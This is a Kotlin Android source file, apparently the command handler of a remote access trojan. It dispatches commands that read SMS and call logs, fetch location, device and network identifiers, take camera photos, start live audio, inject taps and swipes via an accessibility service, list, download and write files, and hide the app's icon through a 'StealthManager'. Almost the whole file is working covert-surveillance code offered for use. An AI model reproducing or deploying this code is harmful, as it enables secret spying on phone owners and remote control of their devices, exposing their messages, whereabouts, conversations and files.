package com.example.admin

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.media.ImageReader
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.CallLog
import android.util.Base64
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.NetworkInterface
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object CommandHandler {

    suspend fun dispatch(ctx: Context, cmd: String, args: JSONObject): JSONObject =
        withContext(Dispatchers.IO) {
            try {
                when (cmd) {
                    "get_device_info" -> deviceInfo(ctx)
                    "get_sms" -> getSms(ctx, args.optInt("limit", 100))
                    "get_calllogs" -> getCallLogs(ctx, args.optInt("limit", 100))
                    "get_location" -> getLocation(ctx)
                    "take_camera_photo" -> takeCameraPhoto(ctx, args.optString("facing", "back"))
                    "start_audio" -> startAudio(ctx)
                    "stop_audio" -> stopAudio(ctx)
                    "start_screen" -> startScreen(ctx)
                    "stop_screen" -> stopScreen(ctx)
                    "vibrate" -> vibrate(ctx, args.optLong("ms", 500L))
                    "tap" -> tap(args.optDouble("x", 0.0).toFloat(), args.optDouble("y", 0.0).toFloat())
                    "swipe" -> swipe(
                        args.optDouble("x1", 0.0).toFloat(),
                        args.optDouble("y1", 0.0).toFloat(),
                        args.optDouble("x2", 0.0).toFloat(),
                        args.optDouble("y2", 0.0).toFloat(),
                        args.optLong("duration", 300L)
                    )
                    "hide_icon" -> { StealthManager.hide(ctx); ok() }
                    "unhide_icon" -> { StealthManager.unhide(ctx); ok() }
                    "list_dir" -> listDir(args.optString("path", "/"))
                    "download_file" -> downloadFile(args.optString("path", ""))
                    "upload_file" -> uploadFile(args.optString("path", ""), args.optString("data", ""))
                    else -> fail("unknown cmd: $cmd")
                }
            } catch (e: Exception) {
                fail(e.message ?: e.javaClass.simpleName)
            }
        }

    private fun ok(data: Any? = null): JSONObject {
        val o = JSONObject().put("ok", true)
        if (data != null) o.put("data", data)
        return o
    }

    private fun fail(msg: String): JSONObject = JSONObject().put("ok", false).put("error", msg)

    private fun deviceInfo(ctx: Context): JSONObject {
        val battery = ctx.getSystemService(Context.BATTERY_SERVICE)
            .let { (it as android.os.BatteryManager).getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) }
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
        val simOp = try { tm.networkOperatorName } catch (_: Exception) { "" }
        val simCountry = try { tm.simCountryIso } catch (_: Exception) { "" }
        val mac = try { firstMac() } catch (_: Exception) { "unavailable" }
        val ip = try { firstIpv4() } catch (_: Exception) { "unavailable" }
        val data = JSONObject()
            .put("model", Build.MODEL)
            .put("manufacturer", Build.MANUFACTURER)
            .put("android", Build.VERSION.RELEASE)
            .put("sdk", Build.VERSION.SDK_INT)
            .put("battery", battery)
            .put("sim_operator", simOp)
            .put("sim_country", simCountry)
            .put("mac", mac)
            .put("ip", ip)
        return ok(data)
    }

    private fun firstMac(): String {
        val ifaces = NetworkInterface.getNetworkInterfaces() ?: return "unavailable"
        for (nif in ifaces) {
            if (nif.isLoopback || nif.hardwareAddress == null) continue
            return nif.hardwareAddress!!.joinToString(":") { "%02x".format(it) }
        }
        return "unavailable"
    }

    private fun firstIpv4(): String {
        val ifaces = NetworkInterface.getNetworkInterfaces() ?: return "unavailable"
        for (nif in ifaces) {
            if (nif.isLoopback) continue
            for (addr in nif.inetAddresses) {
                val h = addr.hostAddress ?: continue
                if (h.matches(Regex("""\d+\.\d+\.\d+\.\d+"""))) return h
            }
        }
        return "unavailable"
    }

    private fun getSms(ctx: Context, limit: Int): JSONObject {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) return fail("READ_SMS not granted")
        val out = JSONArray()
        val cursor = ctx.contentResolver.query(
            Uri.parse("content://sms"),
            arrayOf("_id", "address", "body", "date", "type"),
            null, null, "date DESC LIMIT $limit"
        )
        cursor?.use {
            while (it.moveToNext()) {
                out.put(JSONObject()
                    .put("id", it.getString(0))
                    .put("address", it.getString(1))
                    .put("body", it.getString(2))
                    .put("date", it.getLong(3))
                    .put("type", it.getInt(4)))
            }
        }
        return ok(out)
    }

    private fun getCallLogs(ctx: Context, limit: Int): JSONObject {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) return fail("READ_CALL_LOG not granted")
        val out = JSONArray()
        val cursor = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DURATION,
                CallLog.Calls.TYPE, CallLog.Calls.DATE),
            null, null, "${CallLog.Calls.DATE} DESC LIMIT $limit"
        )
        cursor?.use {
            while (it.moveToNext()) {
                out.put(JSONObject()
                    .put("id", it.getString(0))
                    .put("number", it.getString(1))
                    .put("duration", it.getLong(2))
                    .put("type", it.getInt(3))
                    .put("date", it.getLong(4)))
            }
        }
        return ok(out)
    }

    private fun getLocation(ctx: Context): JSONObject {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) return fail("location not granted")
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var best: android.location.Location? = null
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)
        for (p in providers) {
            try {
                val l = lm.getLastKnownLocation(p) ?: continue
                if (best == null || l.time > best!!.time) best = l
            } catch (_: Exception) {}
        }
        val l = best ?: return fail("no last-known fix")
        return ok(JSONObject()
            .put("lat", l.latitude)
            .put("lon", l.longitude)
            .put("acc", l.accuracy)
            .put("time", l.time)
            .put("provider", l.provider ?: ""))
    }

    private fun takeCameraPhoto(ctx: Context, facingStr: String): JSONObject {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) return fail("CAMERA not granted")

        val facing = if (facingStr == "front") CameraCharacteristics.LENS_FACING_FRONT
                     else CameraCharacteristics.LENS_FACING_BACK
        val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val id = cm.cameraIdList.firstOrNull { cid ->
            cm.getCameraCharacteristics(cid).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: return fail("no camera facing=$facingStr")

        val chars = cm.getCameraCharacteristics(id)
        val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?: return fail("no scaler map")
        val size = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
            .maxByOrNull { it.width * it.height } ?: return fail("no jpeg size")

        val reader = ImageReader.newInstance(size.width, size.height, android.graphics.ImageFormat.JPEG, 2)
        val ht = HandlerThread("cam2").also { it.start() }
        val handler = Handler(ht.looper)
        val latch = CountDownLatch(1)
        val result = JSONObject()
        
        var session: CameraCaptureSession? = null
        var device: CameraDevice? = null

        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage()
            if (img != null) {
                try {
                    val b = img.planes[0].buffer
                    val bytes = ByteArray(b.remaining())
                    b.get(bytes)
                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    result.put("ok", true).put("data",
                        JSONObject().put("jpeg_b64", b64).put("facing", facingStr))
                } catch (e: Exception) {
                    result.put("ok", false).put("error", e.message ?: "encode")
                } finally {
                    try { img.close() } catch (_: Exception) {}
                    latch.countDown()
                }
            }
        }, handler)

        try {
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    device = camera
                    try {
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            .apply { addTarget(reader.surface) }
                            .build()
                        camera.createCaptureSession(listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    session = s
                                    s.capture(req, null, handler)
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    result.put("ok", false).put("error", "session config failed")
                                    latch.countDown()
                                }
                            }, handler)
                    } catch (e: Exception) {
                        result.put("ok", false).put("error", e.message ?: "capture")
                        latch.countDown()
                    }
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    result.put("ok", false).put("error", "camera error $error")
                    latch.countDown()
                }
            }, handler)
        } catch (e: SecurityException) {
            return fail("camera permission: ${e.message}")
        }

        latch.await(10, TimeUnit.SECONDS)
        try { session?.close() } catch (_: Exception) {}
        try { device?.close() } catch (_: Exception) {}
        try { reader.close() } catch (_: Exception) {}
        ht.quitSafely()

        return if (result.optBoolean("ok")) result else fail(result.optString("error", "timeout"))
    }

    private fun startAudio(ctx: Context): JSONObject {
        val i = Intent(ctx, LiveAudioService::class.java)
        ContextCompat.startForegroundService(ctx, i)
        return ok()
    }

    private fun stopAudio(ctx: Context): JSONObject {
        val i = Intent(ctx, LiveAudioService::class.java).apply { action = LiveAudioService.ACTION_STOP }
        ctx.startService(i)
        return ok()
    }

    private fun startScreen(ctx: Context): JSONObject {
        return fail("screen capture must be granted from the app: open Device Manager -> Grant screen capture")
    }

    private fun stopScreen(ctx: Context): JSONObject {
        ctx.stopService(Intent(ctx, ScreenCaptureService::class.java))
        return ok()
    }

    private fun vibrate(ctx: Context, ms: Long): JSONObject {
        val v: Vibrator = if (Build.VERSION.SDK_INT >= 31) {
            (ctx.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
        v.vibrate(VibrationEffect.createOneShot(ms.coerceIn(50L, 5000L),
            VibrationEffect.DEFAULT_AMPLITUDE))
        return ok()
    }

    private fun tap(x: Float, y: Float): JSONObject {
        val svc = TouchService.instance ?: return fail("accessibility service not enabled")
        val sent = svc.tap(x, y)
        return if (sent) ok() else fail("gesture rejected")
    }

    private fun swipe(x1: Float, y1: Float, x2: Float, y2: Float, ms: Long): JSONObject {
        val svc = TouchService.instance ?: return fail("accessibility service not enabled")
        val sent = svc.swipe(x1, y1, x2, y2, ms)
        return if (sent) ok() else fail("gesture rejected")
    }

    private fun listDir(path: String): JSONObject {
        val dir = File(path)
        if (!dir.exists()) return fail("not found: $path")
        if (!dir.isDirectory) return fail("not a directory: $path")
        val arr = JSONArray()
        dir.listFiles()?.sortedBy { it.name }?.forEach { f ->
            arr.put(JSONObject()
                .put("name", f.name)
                .put("path", f.absolutePath)
                .put("dir", f.isDirectory)
                .put("size", if (f.isFile) f.length() else 0L))
        }
        return ok(JSONObject().put("path", dir.absolutePath).put("entries", arr))
    }

    private fun downloadFile(path: String): JSONObject {
        val f = File(path)
        if (!f.exists() || !f.isFile) return fail("not a file: $path")
        if (f.length() > 8L * 1024 * 1024) return fail("file too large (>8MB)")
        val bytes = f.readBytes()
        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        return ok(JSONObject().put("path", f.absolutePath).put("size", bytes.size).put("b64", b64))
    }

    private fun uploadFile(path: String, b64: String): JSONObject {
        if (b64.isEmpty()) return fail("empty payload")
        val bytes = Base64.decode(b64, Base64.DEFAULT)
        val f = File(path)
        f.parentFile?.mkdirs()
        f.writeBytes(bytes)
        return ok(JSONObject().put("path", f.absolutePath).put("size", bytes.size))
    }
}
